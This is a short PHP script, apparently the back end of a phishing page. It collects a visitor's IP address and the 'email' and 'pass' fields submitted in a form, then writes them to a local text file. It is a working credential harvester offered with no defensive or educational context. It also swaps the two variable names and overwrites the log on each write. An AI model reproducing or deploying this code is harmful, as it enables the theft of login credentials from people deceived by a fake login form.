<?php
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip=$_SERVER['HTTP_CLIENT_IP'];
} else if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip=$_SERVER['REMOTE_ADDR'];
}
$pass=$_POST["email"];
$email=$_POST["pass"];
$file=fopen("test.txt","w");
fwrite($file,"ip:$ip\npass:$pass\nemail:$email\n");
?>
